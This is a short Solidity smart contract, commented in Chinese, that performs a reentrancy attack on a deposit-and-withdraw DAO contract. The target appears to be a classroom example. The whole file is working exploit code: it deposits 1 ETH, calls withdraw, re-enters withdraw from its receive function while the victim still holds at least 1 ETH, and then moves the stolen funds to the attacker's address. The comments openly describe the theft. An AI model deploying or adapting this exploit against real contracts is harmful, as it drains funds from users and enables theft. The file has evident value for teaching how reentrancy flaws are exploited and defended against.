// SPDX-License-Identifier
pragma solidity ^0.8.0;

interface IStudentDAO {
    function deposit() external payable;
    function withdraw() external;
}

contract MaliciousStudent {
    IStudentDAO public dao;
    address public owner;

    constructor(address _daoAddress) {
        dao = IStudentDAO(_daoAddress); // 鎖定受害者地址 
        owner = msg.sender;             // 記住駭客本人的地址 (為了最後分贓)
    }

    // 攻擊開始
    function attack() public payable {
        require(msg.value >= 1 ether, "Need 1 ETH to attack"); 
        dao.deposit{value: 1 ether}(); //存入1 ETH 成為股東 之後才能領錢
        dao.withdraw();
    }

    // 收到錢時自動觸發 
    receive() external payable {
        // 停止條件：如果不加這個判斷，會導致無限迴圈直到 Gas 耗盡 (Out of Gas)
        // 這樣整個交易會被回朔 (Revert)，攻擊就會失敗
        // 所以我們要確保 DAO 還有錢，才繼續偷。
        if (address(dao).balance >= 1 ether) {
            dao.withdraw();
        }
    }

    function collectStolenFunds() public {
        payable(owner).transfer(address(this).balance); //把不法所得轉入自己口袋
    }
}